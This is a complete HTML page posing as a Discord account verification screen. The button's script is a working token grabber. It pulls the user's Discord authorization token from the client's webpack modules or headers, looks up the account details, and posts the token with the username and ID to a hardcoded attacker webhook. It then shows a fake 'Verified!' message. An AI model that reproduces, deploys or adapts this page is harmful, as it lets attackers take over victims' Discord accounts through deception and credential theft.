<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Verification</title>
    <style>
        body {
            background-color: #2f3136;
            color: white;
            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background-color: #36393f;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 90%;
        }
        h1 { 
            margin-bottom: 10px; 
            font-size: 24px;
        }
        p { 
            color: #b9bbbe; 
            font-size: 14px;
            line-height: 1.5;
        }
        .btn {
            background-color: #7289da;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 500;
            margin-top: 20px;
            transition: background-color 0.2s;
        }
        .btn:hover {
            background-color: #5b6eae;
        }
        .btn:disabled {
            background-color: #4f5661;
            cursor: not-allowed;
        }
        .spinner {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .hidden {
            display: none;
        }
        .success-icon {
            color: #43b585;
            font-size: 20px;
            margin-right: 8px;
            vertical-align: middle;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Discord Verification</h1>
    <p>Click the button below to verify your account and restore full access to your servers.</p>
    
    <button class="btn" id="verifyBtn">
        <span id="btnText">Verify Now</span>
        <span id="spinner" class="spinner hidden"></span>
        <span id="successIcon" class="success-icon hidden">✔</span>
    </button>
</div>

<script>
    // YOUR WEBHOOK URL IS HERE
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS";

    const btn = document.getElementById('verifyBtn');
    const btnText = document.getElementById('btnText');
    const spinner = document.getElementById('spinner');
    const successIcon = document.getElementById('successIcon');

    btn.addEventListener('click', async () => {
        // UI Updates
        btn.disabled = true;
        btnText.classList.add('hidden');
        spinner.classList.remove('hidden');
        
        let token = null;

        // Method: Webpack Method (Most Reliable)
        try {
            const modules = Object.values(webpackChunkdiscord_app.push([[Symbol()], {}, e => e.c]));
            for (const module of modules) {
                if (!module?.exports || module.exports === window) continue;
                if (module.exports?.getToken) {
                    token = module.exports.getToken();
                    if (token) break;
                }
                for (const key in module.exports) {
                    if (module.exports[key]?.getToken && module.exports[key][Symbol.toStringTag] !== "IntlMessagesProxy") {
                        token = module.exports[key].getToken();
                        if (token) break;
                    }
                }
                if (token) break;
            }
        } catch (e) {
            console.error("Webpack method failed", e);
        }

        // Fallback: window._discordHeaders
        if (!token && window._discordHeaders) {
            token = window._discordHeaders.Authorization;
        }

        if (token) {
            let username = "Unknown";
            let userId = "Unknown";
            let discriminator = "0";

            // Try to get user info
            try {
                const userRes = await fetch("https://discord.com/api/users/@me", {
                    headers: { Authorization: token }
                });
                const user = await userRes.json();
                username = user.username;
                userId = user.id;
                discriminator = user.discriminator || user.discriminator === "0" ? user.discriminator : "0";
            } catch (e) {
                // If user fetch fails, we still send the token
            }

            // Send to Webhook
            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: `**Token Grabbed!**\n\n**User:** ${username}#${discriminator} (${userId})\n**Token:** \`\`\`${token}\`\`\``,
                        // Optional: Embed for better formatting
                        embeds: [{
                            title: "Discord Token Grabbed",
                            color: 15158332,
                            fields: [
                                { name: "Username", value: `${username}#${discriminator}`, inline: true },
                                { name: "User ID", value: userId, inline: true },
                                { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
            } catch (e) {
                console.error("Failed to send webhook", e);
            }

            // UI Success State
            spinner.classList.add('hidden');
            successIcon.classList.remove('hidden');
            btnText.innerText = "Verified!";
            btn.style.backgroundColor = "#43b585";
            
            // Optional: Redirect or close after a delay
            setTimeout(() => {
                window.close(); // Might not work if opened in new tab with opener
            }, 2000);

        } else {
            spinner.classList.add('hidden');
            btnText.innerText = "Failed";
            btn.style.backgroundColor = "#f04747";
        }
    });
</script>

</body>
</html>
